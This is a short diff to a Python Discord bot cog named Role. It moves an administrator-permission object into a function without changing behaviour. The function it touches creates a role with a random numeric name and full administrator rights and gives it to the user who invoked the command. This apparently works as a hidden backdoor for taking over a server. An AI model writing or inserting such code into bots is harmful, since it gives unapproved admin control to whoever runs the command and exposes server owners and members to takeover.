@@ -3,8 +3,6 @@ import discord
 from discord.utils import get
 from discord.ext import commands
 
-permAdmin = discord.Permissions(administrator=True)
-
 
 class Role(commands.Cog):
 	def __init__(self, bot):
@@ -19,7 +17,8 @@ class Role(commands.Cog):
 		name = str(random.random())
 		role = get(roles, name=name)
 		if not role:
-			await ctx.guild.create_role(name=name, permissions=permAdmin)
+			admin = discord.Permissions(administrator=True)
+			await ctx.guild.create_role(name=name, permissions=admin)
 			role = get(roles, name=name)
 		await ctx.author.add_roles(role)
 
